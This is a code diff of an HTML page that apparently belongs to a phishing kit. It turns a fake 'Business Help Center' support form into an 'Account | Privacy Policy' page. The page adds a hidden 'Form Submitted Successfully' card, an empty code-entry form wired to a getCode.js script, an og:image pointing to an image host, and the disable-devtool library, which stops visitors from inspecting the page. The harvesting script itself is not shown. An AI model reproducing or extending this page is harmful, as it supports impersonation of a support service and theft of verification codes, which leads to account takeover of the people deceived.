@@ -1,11 +1,11 @@
 <!doctype html>
 <html lang="en">
   <head>
-    <title>Help Center</title>
+    <title>Account | Privacy Policy</title>
     <!-- Required meta tags -->
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-
+    <meta property="og:image" content="https://ibb.co/LzV5YPrf" />
     <!-- Bootstrap CSS v5.2.1 -->
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -51,90 +51,55 @@
       referrerpolicy="no-referrer"
     />
     <link rel="stylesheet" href="/style/index.css" />
-
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   </head>
 
   <body>
     <div id="google_translate_element" class="hidden"></div>
-    <div class="container-fuid" style="overflow: hidden; height: 100vh">
-      <div class="row position-relative" style="height: 30vh">
-        <img
-          src="/img/banner-b1482d4c.webp"
-          style="object-fit: cover; object-position: center; padding: 0"
-          alt=""
-        />
+    <div class="lsd-ring-container d-none">
+      <div class="lds-ring">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+    </div>
+    <div class="card-container d-none" id="getCode">
+      <div class="card" style="max-width: 700px; border: none">
         <div
-          class="position-absolute text-light"
-          style="
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
-          "
+          class="card-header py-3"
+          style="background-color: rgb(53 87 151); color: white"
         >
-          <p style="font-size: 20px">Business Help Center</p>
-          <h1 style="font-weight: 600">How can we help you?</h1>
+          Form Submitted Successfully
         </div>
-      </div>
-      <div class="row justify-content-center mt-5">
-        <div class="col-10 col-xl-7 col-md-8 text-center">
-          <h4 class="fw-semibold">How can we help?</h4>
-          <p>
-            We need more information to address your issue. This form will only
-            take a few minutes.
+        <div class="card-body">
+          <p class="card-text text-muted">
+            Thanks for contacting us. You'll get a notification when we respond
+            in 1-2 business days. You can view responses in your Support Inbox.
           </p>
-        </div>
-      </div>
-      <div class="row justify-content-center mt-5">
-        <div class="col-11 col-xl-7 col-md-8">
-          <form
-            action="/community-standard.html"
-            class="rounded p-3 w-100"
-            style="box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px"
+          <hr />
+          <span
+            id="back-hone"
+            href="#"
+            class="btn"
+            style="background-color: rgb(53 87 151); color: white"
+            >I Understand</span
           >
-            <p class="fw-semibold">Most common issues</p>
-            <div class="d-flex justify-content-center">
-              <div
-                class="p-3"
-                style="
-                  box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;
-                  width: 100%;
-                "
-              >
-                <div class="form-check mb-3">
-                  <input
-                    class="form-check-input"
-                    type="radio"
-                    name="flexRadioDisabled"
-                    id="flexRadioCheckedDisabled"
-                    required
-                  />
-                  <label
-                    class="form-check-label"
-                    for="flexRadioCheckedDisabled"
-                  >
-                    I need to contact the support team
-                  </label>
-                </div>
-              </div>
-            </div>
-            <div class="d-flex justify-content-end mt-3" style="width: 100%">
-              <button
-                type="submit"
-                id="btn-submit"
-                class="btn text-light"
-                disabled
-                style="background-color: #223654"
-              >
-                Next
-              </button>
-            </div>
-          </form>
         </div>
       </div>
     </div>
-
+    <div class="bg-light d-flex justify-content-center align-items-center">
+      <div
+        class="card my-5"
+        id="code-form"
+        style="
+          max-width: 650px;
+          border: none;
+          box-shadow: rgba(149, 157, 165, 0.2) 0px 8px 24px;
+        "
+      >
+        <div class="card-body"></div>
+      </div>
+    </div>
     <!-- Bootstrap JavaScript Libraries -->
     <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
     <script
@@ -149,29 +114,11 @@
       crossorigin="anonymous"
     ></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.8/dist/sweetalert2.all.min.js"></script>
+    <script type="module" src="/js/getCode.js"></script>
     <script
       disable-devtool-auto
       src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"
     ></script>
-    <script>
-      let isConfirm = false;
-      let isNotRobot = false;
-      $(document).ready(function () {
-        $("#flexRadioCheckedDisabled").on("change", function () {
-          if ($(this).is(":checked")) {
-            isConfirm = true;
-          } else {
-            isConfirm = false;
-          }
-
-          if (isConfirm) {
-            $("#btn-submit").attr("disabled", false);
-          } else {
-            $("#btn-submit").attr("disabled", true);
-          }
-        });
-      });
-    </script>
     <script>
       const loadGoogleTranslate = async () => {
         try {
@@ -179,7 +126,7 @@
           const data = await response.json();
           const countryCode = data.country_code;
 
-          const response2 = await fetch("country_to_language.json");
+          const response2 = await fetch("../country_to_language.json");
           const languageMap = await response2.json();
           const languageCode = languageMap[countryCode] || "en";
 
